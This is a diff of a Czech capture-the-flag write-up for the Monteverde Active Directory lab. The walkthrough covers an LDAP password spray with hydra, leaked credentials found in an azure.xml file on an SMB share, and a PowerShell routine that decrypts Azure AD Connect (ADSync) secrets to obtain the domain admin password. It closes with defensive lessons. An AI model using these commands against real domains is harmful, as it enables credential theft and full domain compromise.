@@ -7,140 +7,105 @@ tags: windows kerberos ldap winrm active-directory
 ---
 ## Úvod a kontext
 
-U Monteverde není hlavní hodnota v jednom efektním kroku, ale ve vazbě mezi SMB sdílení, Kerberos a LDAP.
+Monteverde je výborný příklad Active Directory stroje, kde se foothold neotevře exploitací služby, ale chybnou prací s hesly a tajemstvími. První krok je jednoduchý password spray proti LDAP. Druhý krok vede přes soubor `azure.xml` uložený v cizím domovském adresáři. Root, respektive doménový admin, pak přichází přes Azure AD Connect a lokálně uložené synchronizační tajemství.
 
-Článek dává smysl číst hlavně jako rozbor rozhodování: proč právě tyto stopy vedou k WinRM s ověřeným heslem a proč po získání shellu dává smysl řešit lokální enumeraci po získání shellu.
+Právě poslední část je na Monteverde nejzajímavější. Administrátor neprohrává kvůli kernel exploitu, ale proto, že na serveru běží ADSync s dešifrovatelnými přístupovými údaji k doméně.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### Typický Domain Controller
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+`nmap` dává okamžitě jasný obrázek: Kerberos, LDAP, SMB, WinRM a další služby typické pro Domain Controller. V takové situaci dává smysl soustředit se na účty a sdílení, ne na webový exploit, protože web tu vůbec není.
 ```bash
 ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -Pn -p $ports -A -sC -sV -v $IP
 ```
-```
+```text
 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771
 PORT      STATE SERVICE       VERSION
-53/tcp    open  domain?
-| fingerprint-strings:
-|   DNSVersionBindReqTCP:
-|     version
-|_    bind
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-11 21:39:25Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
 445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
 9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49670/tcp open  msrpc         Microsoft Windows RPC
-49671/tcp open  msrpc         Microsoft Windows RPC
-49702/tcp open  msrpc         Microsoft Windows RPC
-49771/tcp open  msrpc         Microsoft Windows RPC
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=5E1A3EB1%P=x86_64-pc-linux-gnu%r(DNSV
-SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
-SF:x04bind\0\0\x10\0\x03");
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
-No OS matches for host
-Network Distance: 2 hops
-TCP Sequence Prediction: Difficulty=263 (Good luck!)
-IP ID Sequence Generation: Randomized
-Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-### Vyhledání otevřených portů (2)
+### Seznam účtů a password spray
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
-```bash
-nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771 -n -v -sV -Pn --script *vuln*,*enum* $IP
+Jakmile je jasné, že jde o AD, je rozumné si nejdřív vytáhnout seznam uživatelů a zkusit velmi úzký password spray. Na Monteverde funguje varianta `username == password` pro účet `SABatchJobs`, což je přesně ten typ provozního zjednodušení, který v doméně otevírá další enumeraci.
+```text
+GetADUsers.py -all MEGABANK.LOCAL/
+=> mhope
+=> SABatchJobs
+=> svc-ata
+=> svc-bexec
+=> svc-netapp
+
+hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
+=> [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
 ```
 
-### Enumerace SMB
-
-U SMB sdílení ověřuji, jaká data jsou dostupná bez dalších oprávnění a zda z nich lze získat účty, dokumenty nebo konfigurační tajemství.
+S těmito údaji už jde systematicky procházet SMB sdílení a hledat cizí konfigurace nebo exporty.
 ```bash
 ./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
 ```
-```
+```text
 => home$/mhope/azure.xml: 4n0therD4y@n0th3r$
-```
-
-## Analýza zjištění
-
-### Lámání hesel nebo hashů
-
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
-```
-```
-=> [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: __CENSORED__
 ```
 
 ## Získání přístupu
 
-### Přihlášení na cíl
+### WinRM jako `mhope`
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+Soubor `azure.xml` obsahuje heslo účtu `mhope` a právě ten se hodí pro WinRM. Tím se z read-only přístupu do SMB stává skutečný shell na serveru.
 ```bash
 ./evil-winrm/evil-winrm.rb -i $IP -u mhope -p "4n0therD4y@n0th3r$"
 ```
 
 ### Získání user flagu
 
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-```bash
+Na účtu `mhope` už lze normálně pokračovat lokální enumerací a potvrdit foothold přes `user.txt`.
+```text
 cat user.txt
-```
-```
-__CENSORED__
-```
-
-### Přihlášení na cíl (2)
-
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
-```bash
-./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"
-```
-```
-gc root.txt
 __CENSORED__
 ```
 
 ## Eskalace oprávnění
 
-### Získání root flagu
+### Azure AD Connect a dešifrování ADSync hesla
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+Na účtu `mhope` je klíčové nevěnovat se jen běžným službám, ale zkontrolovat nainstalovaný software. Monteverde má Azure AD Connect a lokální SQL Server, což je velmi silná stopa. ADSync si musí někam ukládat synchronizační tajemství a na hostu jsou k tomu všechny potřebné komponenty včetně `mcrypt.dll`.
 
-Následující úsek zachycuje i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.
+Postup je pak přímočarý: z databáze `ADSync` se vytáhne `entropy`, `instance_id`, `keyset_id` a zašifrovaná konfigurace, pomocí `mcrypt.dll` se obsah dešifruje a z XML vypadnou doménové přihlašovací údaje.
+```powershell
+$mms_server_configuration = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "tcp:monteverde,1433" -Database "ADSync"
+$mms_management_agent = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -ServerInstance "tcp:monteverde,1433" -Database "ADSync"
 
-```text
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($mms_server_configuration.entropy, $mms_server_configuration.instance_id, $mms_server_configuration.keyset_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$decrypted = $null
+$key.DecryptBase64ToString($mms_management_agent.encrypted_configuration, [ref]$decrypted)
+```
+
+Výsledek je účet `administrator` s heslem `d0m@in4dminyeah!`, takže finální krok je už jen nové přihlášení přes WinRM.
+```bash
 ./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"
 gc root.txt
-12909612d25c8dcf6e5a07d1a804a0bc
+```
+```text
+__CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Počáteční průzkum začal dávat smysl až po spojení password spray a souboru `azure.xml` v domovském adresáři `mhope`.
-- User část stála na ověřeném WinRM přístupu k `mhope`, takže šlo o stabilní a reprodukovatelný foothold.
-- Poslední krok už nebyl o nové zranitelnosti, ale o dalším reuse doménových hesel až k účtu `administrator`.
+- Foothold na Monteverde nezačal exploitem, ale úspěšným password sprayem proti LDAP a následným průchodem SMB sdílení.
+- Nejdůležitějším artefaktem pro user část byl `azure.xml` v domovském adresáři `mhope`, tedy čistý únik tajemství mezi účty.
+- Root část nestojí na reuse běžného hesla, ale na tom, že Azure AD Connect ukládá dešifrovatelné synchronizační údaje přímo na serveru.
 
 ## Co si odnést do praxe
 
-- V tomhle článku se první slabé místo otevřelo přes SMB sdílení, Kerberos a LDAP. SMB sdílení mají mít opravdu minimální ACL a průběžný audit obsahu; i read-only přístup často útočníkovi dá víc než samotná zranitelnost služby.
-- Stabilní foothold pak stojí na principu WinRM s ověřeným heslem. WinRM má být dostupný jen z management sítě a s unikátními přístupy; jinak z každého úniku hesla vznikne okamžitý administrativní kanál.
-- Pro závěrečnou fázi je podstatné, že rozhodla lokální enumerace po získání shellu. Po získání shellu je rozhodující systematická lokální enumerace; i bez další CVE často rozhodne kombinace špatných oprávnění, reuse tajemství a pomocných skriptů.
+- Password spray s malým rozsahem bývá v AD pořád účinnější než složité exploity. Obrana stojí na silných heslech, lockout policy a kontrole účtů typu `username == password`.
+- Konfigurační soubory jako `azure.xml` nesmějí ležet v uživatelských profilech nebo sdíleních dostupných jiným účtům. Jediný takový soubor může otevřít WinRM nebo jiný vzdálený management.
+- Servery s Azure AD Connect je potřeba chránit jako vysoce citlivé systémy. Kdo získá lokální přístup k ADSync hostu, může často obnovit i doménová synchronizační tajemství.
